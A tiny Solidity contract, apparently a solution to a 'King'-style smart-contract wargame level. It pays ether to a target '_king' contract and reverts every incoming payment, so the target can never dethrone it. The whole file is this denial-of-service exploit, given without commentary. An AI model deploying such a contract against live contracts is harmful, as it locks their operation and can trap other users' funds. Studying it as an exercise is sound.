// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Queen{
    constructor(address payable _king) public payable{
        _king.call{value: 1000000000000000 wei}("");




    }

    receive() external payable{
        revert();
    }
}
